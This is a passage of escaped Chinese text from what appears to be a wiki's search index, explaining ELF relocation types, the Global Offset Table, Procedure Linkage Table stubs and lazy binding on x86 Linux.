\u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7528\u4e8e\u628a\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u7b26\u53f7\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7b26\u53f7\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u7279\u6b8a\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u5141\u8bb8\u786e\u5b9a\u7b26\u53f7\u548c\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e4b\u95f4\u7684\u5173\u7cfb\u3002 R_386_JMP_SLOT 7 word32 S \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u76f8\u5e94\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4fee\u6539\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u4ece\u800c\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e0a\u8ff0\u6307\u51fa\u7684\u7b26\u53f7\u5730\u5740\u3002 R_386_RELATIVE 8 word32 B + A \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u7ed9\u51fa\u4e86\u5171\u4eab\u76ee\u6807\u4e2d\u7684\u4e00\u4e2a\u5305\u542b\u4e86\u67d0\u4e2a\u4ee3\u8868\u76f8\u5bf9\u5730\u5740\u7684\u503c\u7684\u4f4d\u7f6e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u901a\u8fc7\u628a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u88c5\u8f7d\u5230\u7684\u865a\u62df\u5730\u5740\u4e0e\u4e0a\u8ff0\u76f8\u5bf9\u5730\u5740\u76f8\u52a0\u6765\u8ba1\u7b97\u5bf9\u5e94\u865a\u62df\u5730\u5740\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u91cd\u5b9a\u4f4d\u9879\u8bbe\u7f6e\u7b26\u53f7\u8868\u7d22\u5f15\u4e3a0\u3002 R_386_GOTOFF 9 word32 S + A - GOT \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u503c\u4e0e\u5168\u5c40\u504f\u79fb\u8868\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u901a\u77e5\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002 R_386_GOTPC 10 word32 S + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u4e0e R_386_PC32 \u7c7b\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5728\u8ba1\u7b97\u65f6\u4f7f\u7528\u5168\u5c40\u504f\u79fb\u8868\u7684\u5730\u5740\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8be5\u91cd\u5b9a\u4f4d\u8868\u9879\u4e2d\u88ab\u5f15\u7528\u7684\u7b26\u53f7\u662f _GLOBAL_OFFSET_TABLE_ \uff0c\u5b83\u4f1a\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002","title":"\u91cd\u5b9a\u4f4d\u7c7b\u578b"},{"location":"executable/elf/elf_structure/#global-offset-table","text":"GOT \u8868\u5728 ELF \u6587\u4ef6\u4e2d\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 .got\uff0c\u5b58\u50a8\u5168\u5c40\u53d8\u91cf\u7684\u5f15\u7528\u3002 .got.plt\uff0c\u5b58\u50a8\u51fd\u6570\u7684\u5f15\u7528\u3002 \u5176\u76f8\u5e94\u7684\u503c\u7531\u80fd\u591f\u89e3\u6790.rel.plt \u6bb5\u4e2d\u7684\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u5668\u6765\u586b\u5199\u3002 \u901a\u5e38\u6765\u8bf4\uff0c\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u4e0d\u80fd\u5305\u542b\u7edd\u5bf9\u865a\u62df\u5730\u5740\u3002GOT\u8868\u4e2d\u5305\u542b\u4e86\u9690\u85cf\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u8fd9\u4f7f\u5f97\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u65e0\u5173\u6027\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u5f97\u5230\u76f8\u5173\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002\u4e00\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u4f4d\u7f6e\u72ec\u7acb\u4ee3\u7801\u6765\u5f15\u7528\u5b83\u7684GOT\u8868\uff0c\u7136\u540e\u63d0\u53d6\u51fa\u6765\u7edd\u5bf9\u7684\u6570\u503c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5f15\u7528\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u7684\u5730\u5740\u3002 \u8fd9\u4e2a\u8868\u5bf9\u4e8e System V \u73af\u5883\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\u662f\u5fc5\u8981\u7684\uff0c\u4f46\u5176\u5177\u4f53\u7684\u5185\u5bb9\u4ee5\u53ca\u5f62\u5f0f\u4f9d\u8d56\u4e8e\u5904\u7406\u5668\u3002 \u521d\u59cb\u65f6\uff0cgot \u8868\u4e2d\u5305\u542b\u91cd\u5b9a\u5411\u5165\u53e3\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5f53\u4e00\u4e2a\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u5185\u5b58\u6bb5\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u5904\u7406\u91cd\u5b9a\u4f4d\u9879\uff0c\u5176\u4e2d\u7684\u4e00\u4e9b\u9879\u7684\u7c7b\u578b\u53ef\u80fd\u662f R_386_GLOB_DAT\uff0c\u8fd9\u4f1a\u6307\u5411 got \u8868\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76f8\u5173\u7684\u7b26\u53f7\u7684\u503c\uff0c\u8ba1\u7b97\u5b83\u4eec\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u7136\u540e\u5c06\u5408\u9002\u7684\u5185\u5b58\u8868\u9879\u8bbe\u7f6e\u4e3a\u76f8\u5e94\u7684\u503c\u3002\u5c3d\u7ba1\u5728\u94fe\u63a5\u5668\u5efa\u7acb\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u7edd\u5bf9\u5730\u5740\u8fd8\u5904\u4e8e\u672a\u77e5\u72b6\u6001\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u77e5\u9053\u6240\u6709\u5185\u5b58\u6bb5\u7684\u5730\u5740\uff0c\u56e0\u4e3a\u53ef\u4ee5\u8ba1\u7b97\u6240\u5305\u542b\u7684\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u3002 \u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u9700\u8981\u76f4\u63a5\u8bbf\u95ee\u4e00\u4e2a\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b26\u53f7\u5c06\u4f1a\u6709\u4e00\u4e2a got \u8868\u9879\u3002\u7531\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u5355\u72ec\u7684\u8868\u9879\uff0c\u6240\u4ee5\u4e00\u4e2a\u7b26\u53f7\u7684\u5730\u5740\u53ef\u80fd\u4f1a\u51fa\u73b0\u5728\u591a\u4e2a\u8868\u4e2d\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5728\u628a\u6743\u9650\u7ed9\u5230\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4ee3\u7801\u6bb5\u524d\uff0c\u4f1a\u5904\u7406\u6240\u6709\u7684 got \u8868\u4e2d\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ee5\u4fbf\u4e8e\u786e\u5b9a\u6240\u6709\u7684\u7edd\u5bf9\u5730\u5740\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002 GOT \u8868\u4e2d\u7684\u7b2c 0 \u9879\u5305\u542b\u52a8\u6001\u7ed3\u6784\u7684\u5730\u5740\uff0c\u7528\u7b26\u53f7 _DYNAMIC \u6765\u8fdb\u884c\u5f15\u7528\u3002\u8fd9\u4f7f\u5f97\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f8b\u5982\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u5728\u6ca1\u6709\u6267\u884c\u5176\u91cd\u5b9a\u5411\u524d\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u52a8\u6001\u7ed3\u6784\u3002\u8fd9\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u5668\u6765\u8bf4\u662f\u975e\u5e38\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u5728\u4e0d\u4f9d\u8d56\u5176\u5b83\u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u91cd\u5b9a\u4f4d\u81ea\u5df1\u7684\u5185\u5b58\u955c\u50cf\u3002 \u5728\u4e0d\u540c\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7cfb\u7edf\u53ef\u80fd\u4f1a\u4e3a\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u9009\u62e9\u4e0d\u540c\u7684\u5185\u5b58\u6bb5\u5730\u5740\uff1b\u751a\u81f3\u5bf9\u4e8e\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5728\u4e0d\u540c\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u5e93\u5730\u5740\u3002\u7136\u800c\uff0c\u4e00\u65e6\u8fdb\u7a0b\u955c\u50cf\u88ab\u5efa\u7acb\uff0c\u5185\u5b58\u6bb5\u7684\u5730\u5740\u5c31\u4e0d\u4f1a\u518d\u6539\u53d8\uff0c\u53ea\u8981\u4e00\u4e2a\u8fdb\u7a0b\u8fd8\u5b58\u5728\uff0c\u5b83\u7684\u5185\u5b58\u6bb5\u5730\u5740\u5c06\u5904\u4e8e\u56fa\u5b9a\u7684\u4f4d\u7f6e\u3002 GOT \u8868\u7684\u5f62\u5f0f\u4ee5\u53ca\u89e3\u91ca\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\uff0c\u5bf9\u4e8e Intel \u67b6\u6784\u6765\u8bf4\uff0c _GLOBAL_OFFSET_TABLE_ \u7b26\u53f7\u53ef\u80fd\u88ab\u7528\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002 extern Elf32_Addr _GLOBAL_OFFSET_TABLE[]; GLOBAL_OFFSET_TABLE \u53ef\u80fd\u4f1a\u5728 .got \u8282\u7684\u4e2d\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4f7f\u7528\u6b63\u8d1f\u7d22\u5f15\u6765\u8bbf\u95ee\u8fd9\u4e2a\u8868\u3002 \u5728 Linux \u7684\u5b9e\u73b0\u4e2d\uff0c.got.plt \u7684\u524d\u4e09\u9879\u7684\u5177\u4f53\u7684\u542b\u4e49\u5982\u4e0b GOT[0]\uff0c.dynamic \u7684\u5730\u5740\u3002 GOT[1]\uff0c\u6307\u5411\u5185\u90e8\u7c7b\u578b\u4e3a link_map \u7684\u6307\u9488\uff0c\u53ea\u4f1a\u5728\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d\u4f7f\u7528\uff0c\u5305\u542b\u4e86\u8fdb\u884c\u7b26\u53f7\u89e3\u6790\u9700\u8981\u7684\u5f53\u524d ELF\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\u6bcf\u4e2a link_map \u90fd\u662f\u4e00\u6761\u53cc\u5411\u94fe\u8868\u7684\u4e00\u4e2a\u8282\u70b9\uff0c\u800c\u8fd9\u4e2a\u94fe\u8868\u4fdd\u5b58\u4e86\u6240\u6709\u52a0\u8f7d\u7684 ELF \u5bf9\u8c61\u7684\u4fe1\u606f\u3002 GOT[2]\uff0c\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d _dl_runtime_resolve \u51fd\u6570\u7684\u6307\u9488\u3002 .got.plt \u540e\u9762\u7684\u9879\u5219\u662f\u7a0b\u5e8f\u4e2d\u4e0d\u540c .so \u4e2d\u51fd\u6570\u7684\u5f15\u7528\u5730\u5740\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u76f8\u5e94\u7684\u5173\u7cfb\u3002","title":"Global Offset Table"},{"location":"executable/elf/elf_structure/#procedure-linkage-table","text":"GOT \u8868\u7528\u6765\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5730\u5740\u91cd\u5b9a\u5411\u4e3a\u7edd\u5bf9\u5730\u5740\uff0c\u4e0e\u6b64\u7c7b\u4f3c\uff0cPLT\u8868\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u51fd\u6570\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u5730\u5740\u3002\u4e3b\u8981\u5305\u62ec\u4e24\u90e8\u5206 .plt \uff0c\u4e0e\u5e38\u89c1\u5bfc\u5165\u7684\u51fd\u6570\u6709\u5173\uff0c\u5982 read \u7b49\u51fd\u6570\u3002 .plt.got \uff0c\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u7cfb\u3002 \u5728\u52a8\u6001\u94fe\u63a5\u4e0b\uff0c\u7a0b\u5e8f\u6a21\u5757\u4e4b\u95f4\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5f15\u7528\uff0c\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u8017\u8d39\u4e0d\u5c11\u65f6\u95f4\u7528\u4e8e\u89e3\u51b3\u6a21\u5757\u4e4b\u95f4\u7684\u51fd\u6570\u5f15\u7528\u7684\u7b26\u53f7\u67e5\u627e\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u5f88\u591a\u51fd\u6570\u5728\u7a0b\u5e8f\u6267\u884c\u5b8c\u65f6\u90fd\u4e0d\u4f1a\u7528\u5230\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u628a\u6240\u6709\u51fd\u6570\u90fd\u94fe\u63a5\u597d\u662f\u4e00\u79cd\u6d6a\u8d39\uff0c\u6240\u4ee5 ELF \u91c7\u7528\u4e86\u4e00\u79cd\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u505a\u6cd5\uff0c\u5176\u57fa\u672c\u601d\u60f3\u662f\u51fd\u6570\u7b2c\u4e00\u6b21\u88ab\u7528\u5230\u65f6\u624d\u8fdb\u884c\u7ed1\u5b9a\uff08\u7b26\u53f7\u67e5\u627e\uff0c\u91cd\u5b9a\u4f4d\u7b49\uff09\uff0c\u5982\u679c\u6ca1\u6709\u7528\u5219\u4e0d\u8fdb\u884c\u7ed1\u5b9a\u3002\u6240\u4ee5\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u6a21\u5757\u95f4\u7684\u51fd\u6570\u8c03\u7528\u90fd\u6ca1\u6709\u8fdb\u884c\u7ed1\u5b9a\uff0c\u800c\u662f\u9700\u8981\u7528\u5230\u65f6\u624d\u7531\u52a8\u6001\u94fe\u63a5\u5668\u8d1f\u8d23\u7ed1\u5b9a\u3002 \u94fe\u63a5\u7f16\u8f91\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u6267\u884c\u6d41\u8f6c\u6362\uff08\u6bd4\u5982\u7a0b\u5e8f\u8c03\u7528\uff09\uff0c\u5373\u4ece\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u3002\u94fe\u63a5\u5668\u5b89\u6392\u7a0b\u5e8f\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u8868\u9879\u3002\u5728 Intel \u67b6\u6784\u4e2d\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u5b58\u5728\u4e8e\u5171\u4eab\u4ee3\u7801\u6bb5\u4e2d\uff0c\u4f46\u662f\u4ed6\u4eec\u4f1a\u4f7f\u7528\u5728 GOT \u8868\u4e2d\u7684\u6570\u636e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76ee\u6807\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u5e76\u4e14\u4f1a\u4fee\u6539\u76f8\u5e94\u7684 GOT \u8868\u4e2d\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u72ec\u7acb\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u5b9a\u5411 PLT \u9879\u3002\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\u3002 \u7edd\u5bf9\u5730\u5740\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u5982\u4e0b .PLT0:pushl got_plus_4 jmp *got_plus_8 nop; nop nop; nop .PLT1:jmp *name1_in_GOT pushl $offset@PC jmp .PLT0@PC .PLT2:jmp *name2_in_GOT push $offset jmp .PLT0@PC ... \u4f4d\u7f6e\u65e0\u5173\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\u5982\u4e0b .PLT0:pushl 4(%ebx) jmp *8(%ebx) nop; nop nop; nop .PLT1:jmp *name1_in_GOT(%ebx) pushl $offset jmp .PLT0@PC .PLT2:jmp *name2_in_GOT(%ebx) push $offset jmp .PLT0@PC ... \u53ef\u4ee5\u770b\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9488\u5bf9\u4e8e\u7edd\u5bf9\u5730\u5740\u4ee5\u53ca\u4f4d\u7f6e\u72ec\u7acb\u7684\u4ee3\u7801\u7684\u5904\u7406\u4e0d\u540c\u3002\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u5b83\u4eec\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u63a5\u53e3\u662f\u4e00\u6837\u7684\u3002 \u52a8\u6001\u94fe\u63a5\u5668\u548c\u7a0b\u5e8f\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u548c\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b26\u53f7\u5f15\u7528\u3002 \u5f53\u7b2c\u4e00\u6b21\u5efa\u7acb\u7a0b\u5e8f\u7684\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u9879\u8bbe\u7f6e\u4e3a\u7279\u6b8a\u7684\u503c\uff0c\u4e0b\u9762\u7684\u6b65\u9aa4\u4f1a\u4ed4\u7ec6\u89e3\u91ca\u8fd9\u4e9b\u6570\u503c\u3002 \u5982\u679c\u8fc7\u7a0b\u94fe\u63a5\u8868\u662f\u4f4d\u7f6e\u72ec\u7acb\u7684\u8bdd\uff0c\u90a3\u4e48 GOT \u8868\u7684\u5730\u5740\u5fc5\u987b\u5728 ebx \u5bc4\u5b58\u5668\u4e2d\u3002\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\uff0c\u5e76\u4e14\u7a0b\u5e8f\u53ea\u5728\u540c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9 PLT \u8868\u9879\u3002\u56e0\u6b64\uff0c\u8c03\u7528\u51fd\u6570\u8d1f\u8d23\u5728\u8c03\u7528 PLT\u8868\u9879\u4e4b\u524d\uff0c\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u57fa\u5730\u5740\u8bbe\u7f6e\u4e3a\u5bc4\u5b58\u5668\u4e2d\u3002 \u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8c03\u7528\u4e86name1\uff0c\u5b83\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u4e86 lable .PLT1\u3002 \u90a3\u4e48\uff0c\u7b2c\u4e00\u6761\u6307\u4ee4\u5c06\u4f1a\u8df3\u8f6c\u5230\u5168\u5c40\u504f\u79fb\u8868\u4e2d name1\u7684\u5730\u5740\u3002\u521d\u59cb\u65f6\uff0c\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u5305\u542b PLT \u4e2d\u4e0b\u4e00\u6761 pushl\u6307\u4ee4\u7684\u5730\u5740\uff0c\u5e76\u4e0d\u662f name1\u7684\u5b9e\u9645\u5730\u5740\u3002 \u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4e00\u4e2a\u91cd\u5b9a\u5411\u504f\u79fb\uff08reloc_index\uff09\u538b\u5230\u6808\u4e0a\u3002\u91cd\u5b9a\u4f4d\u504f\u79fb\u662f 32 \u4f4d\u7684\uff0c\u5e76\u4e14\u662f\u975e\u8d1f\u7684\u6570\u503c\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u7c7b\u578b\u4e3a R_386_JMP_SLOT\uff0c\u5e76\u4e14\u5b83\u5c06\u4f1a\u8bf4\u660e\u5728\u4e4b\u524d jmp \u6307\u4ee4\u4e2d\u4f7f\u7528\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u5728 GOT \u8868\u4e2d\u7684\u504f\u79fb\u3002\u91cd\u5b9a\u4f4d\u8868\u9879\u4e5f\u5305\u542b\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u56e0\u6b64\u544a\u8bc9\u52a8\u6001\u94fe\u63a5\u5668\u4ec0\u4e48\u7b26\u53f7\u76ee\u524d\u6b63\u5728\u88ab\u5f15\u7528\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f name1\u4e86\u3002 \u5728\u538b\u5165\u91cd\u5b9a\u4f4d\u504f\u79fb\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230 .PLT0\uff0c\u8fd9\u662f\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u7b2c\u4e00\u4e2a\u8868\u9879\u3002pushl \u6307\u4ee4\u5c06 GOT \u8868\u7684\u7b2c\u4e8c\u4e2a\u8868\u9879(got_plus_4 \u6216\u80054(%ebx)\uff0c \u5f53\u524dELF\u5bf9\u8c61\u7684\u4fe1\u606f )\u538b\u5230\u6808\u4e0a\uff0c\u7136\u540e\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u8bc6\u522b\u4fe1\u606f\u3002\u6b64\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230\u7b2c\u4e09\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u9879(got_plus_8 \u6216\u80058(%ebx)\uff0c \u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d_dl_runtime_resolve\u51fd\u6570\u7684\u6307\u9488 ) \u5904\uff0c\u8fd9\u5c06\u4f1a\u5c06\u7a0b\u5e8f\u6d41\u4ea4\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u3002 \u5f53\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u6536\u5230\u63a7\u5236\u6743\u540e\uff0c\u4ed6\u5c06\u4f1a\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u7684\u503c\uff0c\u5c06 name1 \u7684\u5730\u5740\u5b58\u50a8\u5728\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e2d\uff0c\u7136\u540e\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u76ee\u7684\u5730\u5740\u3002 \u8fc7\u7a0b\u94fe\u63a5\u8868\u6267\u884c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c06\u4f1a\u76f4\u63a5\u4ea4\u7ed9 name1 \u51fd\u6570\uff0c\u800c\u4e14\u6b64\u540e\u518d\u4e5f\u4e0d\u4f1a\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u5668\u6765\u89e3\u6790\u8fd9\u4e2a\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 .PLT1 \u5904\u7684 jmp \u6307\u4ee4\u5c06\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230 name1 \u5904\uff0c\u800c\u4e0d\u662f\u518d\u6b21\u6267\u884c pushl \u6307\u4ee4\u3002 \u603b\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u84dd\u7ebf\u8868\u793a\u9996\u6b21\u6267\u884c\u7684\u6d41\u7a0b\u56fe\uff0c\u7ea2\u7ebf\u8868\u793a\u7b2c\u4e8c\u6b21\u4ee5\u540e\u8c03\u7528\u7684\u6d41\u7a0b\u56fe\uff1a LD_BIND_NOW \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u884c\u4e3a\u3002\u5982\u679c\u5b83\u7684\u503c\u975e\u7a7a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u7a0b\u5e8f\u4e4b\u524d\u4f1a\u6267\u884c PLT \u8868\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u7c7b\u578b\u4e3a R_3862_JMP_SLOT \u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\u5426\u5219\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u8868\u4f1a\u5bf9\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u8fdb\u884c\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u76f4\u5230\u7b2c\u4e00\u6b21\u6267\u884c\u5bf9\u5e94\u7684\u8868\u9879\u65f6\uff0c\u624d\u4f1a\u4eca\u6b21\u90a3\u4e2a\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002 \u6ce8\u610f \u60f0\u6027\u7ed1\u5b9a\u901a\u5e38\u6765\u8bf4\u4f1a\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528\u7684\u7b26\u53f7\u5e76\u4e0d\u4f1a\u589e\u52a0\u52a8\u6001\u94fe\u63a5\u7684\u8d1f\u8f7d\u3002\u7136\u800c\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u5c06\u4f1a\u4f7f\u5f97\u60f0\u6027\u7ed1\u5b9a\u51fa\u73b0\u672a\u9884\u671f\u7684\u60c5\u51b5\u3002\u9996\u5148\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u51fd\u6570\u7684\u521d\u59cb\u5f15\u7528\u4e00\u822c\u6765\u8bf4\u4f1a\u8d85\u8fc7\u540e\u7eed\u8c03\u7528\u7684\u65f6\u95f4\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u9700\u8981\u62e6\u622a\u8c03\u7528\u4ee5\u4fbf\u4e8e\u53bb\u89e3\u6790\u7b26\u53f7\u3002\u4e00\u4e9b\u5e94\u7528\u5e76\u4e0d\u80fd\u591f\u5fcd\u53d7\u8fd9\u79cd\u4e0d\u53ef\u9884\u6d4b\u6027\u3002\u5176\u6b21\uff0c\u5982\u6